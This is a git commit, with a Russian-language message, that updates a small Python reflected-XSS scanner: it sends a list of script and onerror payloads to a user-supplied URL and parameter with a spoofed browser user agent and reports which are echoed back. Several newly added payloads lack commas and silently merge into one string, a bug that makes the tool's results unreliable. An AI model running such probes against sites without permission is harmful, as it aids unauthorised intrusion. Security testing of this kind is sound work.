8a998829230773d68fd243c81fcab1290d4016e7
Nexor <EgorSmirnov421232112@proton.me>
2025-07-09 21:52:42 +0300

    обновление кода
    улучшен код и добавлено больше пэйлоадов

--- main.py
+++ main.py
@@ -1,18 +1,38 @@
 import requests
+import urllib.parse
 
 payloads = [
     "<script>alert('XSS')</script>",
     "<img src=x onerror=alert('XSS')>",
-    "<svg onload=alert('XSS')>"
+    "<svg onload=alert('XSS')>",
+    "<image/src/onerror=prompt(8)>"
+    "<img/src/onerror=prompt(8)>"
+    "<image src/onerror=prompt(8)>"
+    "<img src/onerror=prompt(8)>"
+    "<image src =q onerror=prompt(8)>"
+    "<img src =q onerror=prompt(8)>"
+    "</scrip</script>t><img src =q onerror=prompt(8)>"
+    
 ]
 
-url = input("Введите url (например, https://example.com): ")
+headers = {
+    "User-Agent": "Mozilla/5.0 (VenturaCounty; Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.89"
+}
+
+url = input("Введите url (например, https://example.com): ").strip()
+param = input("Выбери имя параметра(например, q): ").strip()
+
+print("\nПроверка на xss")
 
 for payload in payloads:
-    test_url = url +"?q=" + payload
-    response = requests.get(test_url)
+    encoded_payload = urllib.parse.quote(payload)
+    test_url = f"{url}?{param}={encoded_payload}"
 
-    if payload in response.text:
-        print(f"{payload}")
-    else:
-        print(f"не сработал {payload}")
+    try:
+        response = requests.get(test_url, headers=headers)
+        if payload in response.text:
+            print(f"Сработал {payload}")
+        else:
+            print(f"не сработал {payload}")
+    except Exception as e:
+        print(f"ошибка {e}")
